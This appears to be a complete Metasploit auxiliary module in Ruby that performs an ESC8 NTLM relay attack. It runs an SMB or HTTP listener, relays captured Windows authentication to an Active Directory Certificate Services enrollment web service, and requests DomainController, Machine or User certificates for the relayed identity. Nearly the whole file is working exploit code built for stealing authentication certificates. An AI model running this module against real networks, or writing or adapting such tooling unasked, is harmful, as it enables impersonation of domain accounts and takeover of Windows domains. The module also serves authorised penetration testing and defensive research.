##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::RelayServer
  include ::Msf::Exploit::Remote::HttpServer::Relay
  include ::Msf::Exploit::Remote::HttpClient
  include ::Msf::Exploit::Remote::HTTP::CertificateEnrollmentServices

  attr_accessor :service

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ESC8 Relay to AD CS Certificate Enrollment Web Service',
        'Description' => %q{
          This module runs an SMB or HTTP server and relays incoming NTLM
          authentication to an AD CS Certificate Enrollment Web Service (CES).
          After authenticating, it submits a WSTEP certificate enrollment
          request for a template available to the relayed account.
        },
        'Author' => [
          'ADHDMurky', # Vulnerability research and PoC
          'jheysel-r7' # Metasploit module
        ],
        'References' => [
          ['URL', 'https://adhdmurky.github.io/posts/post4/'],
          ['URL', 'https://support.microsoft.com/help/5005413'],
          ['URL', 'https://learn.microsoft.com/openspecs/windows_protocols/ms-wstep/'],
          ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE],
          ['ATT&CK', Mitre::Attack::Technique::T1649_STEAL_OR_FORGE_AUTHENTICATION_CERTIFICATES]
        ],
        'License' => MSF_LICENSE,
        'Actions' => [['Relay', { 'Description' => 'Run an NTLM ESC8 relay server' }]],
        'DefaultOptions' => {
          'HTTP::Auth' => Msf::Exploit::Remote::AuthOption::NONE,
          'RPORT' => 443,
          'SSL' => true,
          'SRVPORT' => 445
        },
        'PassiveActions' => ['Relay'],
        'DefaultAction' => 'Relay',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptEnum.new('RELAY_SOURCE', [true, 'Protocol from which to relay NTLM authentication', 'SMB', %w[SMB HTTP]]),
      # Do not use SocketServer's legacy SSL fallback: outbound CES TLS and
      # inbound relay TLS are independent connections.
      OptBool.new('SRVSSL', [false, 'Negotiate SSL/TLS for incoming HTTP relay connections', false], conditions: %w[RELAY_SOURCE == HTTP]),
      OptEnum.new('MODE', [true, 'The certificate issue mode', 'AUTO', %w[AUTO SPECIFIC_TEMPLATE]]),
      OptString.new('CERT_TEMPLATE', [false, 'The template to issue in SPECIFIC_TEMPLATE mode'], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
      OptString.new('TARGETURI', [true, 'Full path to the CES service.svc/CES endpoint']),
      OptAddressRange.new('RHOSTS', [true, 'Target address range or CIDR identifier to relay to'], aliases: %w[SMBHOST RELAY_TARGETS])
    ])

    register_advanced_options([
      OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
      OptEnum.new('CES_AUTH_SCHEME', [true, 'HTTP authorization scheme for the outbound CES handshake', 'Negotiate', %w[Negotiate NTLM]])
    ])

    @issued_certs = {}
  end

  def relay_targets
    relay_headers = { 'Content-Type' => 'application/soap+xml; charset=utf-8' }
    relay_headers['Host'] = datastore['VHOST'] if datastore['VHOST'].present?

    Msf::Exploit::Remote::Relay::TargetList.new(
      (datastore['SSL'] ? :https : :http),
      datastore['RPORT'],
      datastore['RHOSTS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS'],
      protocol_options: {
        http_method: 'POST',
        http_auth_scheme: datastore['CES_AUTH_SCHEME'],
        http_headers: relay_headers,
        http_body: '',
        # An authenticated empty WSTEP request reaches CES but is rejected by
        # the application. Only another 401 means that NTLM authentication failed.
        http_status_code: ->(code) { code != 401 }
      }
    )
  end

  def check_host(target_ip)
    res = send_request_raw(
      'rhost' => target_ip,
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/soap+xml; charset=utf-8',
      'data' => ''
    )
    disconnect

    return Exploit::CheckCode::Unknown('No response received from the target') if res.nil?
    return Exploit::CheckCode::Safe("Target returned HTTP #{res.code} instead of requesting authentication") unless res.code == 401

    authentication = res.headers['WWW-Authenticate'].to_s
    unless authentication.include?('Negotiate') || authentication.include?('NTLM')
      return Exploit::CheckCode::Safe('Target does not offer Windows authentication')
    end

    Exploit::CheckCode::Detected('CES endpoint requests Windows authentication; Extended Protection for Authentication may still prevent relay')
  rescue Rex::ConnectionError, Timeout::Error => e
    Exploit::CheckCode::Unknown("Unable to check CES endpoint: #{e.message}")
  end

  # HttpServer normally prefers LHOST when displaying its listener URL. This
  # relay server has no payload listener, so an explicit SRVHOST is authoritative.
  def srvhost_addr
    return super if datastore['URIHOST'].present?
    return super if Rex::Socket.is_ip_addr?(srvhost) && Rex::Socket.addr_atoi(srvhost) == 0

    srvhost
  end

  def validate
    errors = {}
    errors['HTTP::Auth'] = 'Follow-up CES requests use the already authenticated relay connection' unless datastore['HTTP::Auth'] == Msf::Exploit::Remote::AuthOption::NONE
    if datastore['MODE'] == 'SPECIFIC_TEMPLATE' && datastore['CERT_TEMPLATE'].blank?
      errors['CERT_TEMPLATE'] = 'CERT_TEMPLATE must be set in SPECIFIC_TEMPLATE mode'
    end

    raise OptionValidateError, errors unless errors.empty?

    super
  end

  def run
    relay_targets.each do |target|
      vprint_status("Checking endpoint on #{target}")
      check_code = check_host(target.ip)
      if [Exploit::CheckCode::Unknown, Exploit::CheckCode::Safe].include?(check_code)
        fail_with(Failure::UnexpectedReply, "Certificate Enrollment Web Service does not appear to be enabled on #{target}: #{check_code.reason}")
      end
    end

    relay_service = if datastore['RELAY_SOURCE'] == 'SMB'
                      Msf::Exploit::Remote::SMB::RelayServer.instance_method(:start_service).bind_call(self)
                    else
                      Msf::Exploit::Remote::HttpServer::Relay.instance_method(:start_service).bind_call(self)
                    end
    print_status('Relay server started')
    relay_service.wait if relay_service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    cert_templates = if datastore['MODE'] == 'SPECIFIC_TEMPLATE'
                       [datastore['CERT_TEMPLATE']]
                     elsif relay_identity.end_with?('$')
                       %w[DomainController Machine]
                     else
                       ['User']
                     end

    retrieve_certs(relay_connection, relay_identity, cert_templates)
    vprint_status('Relay tasks complete; waiting for the next login attempt')
  ensure
    relay_connection.disconnect!
  end
end
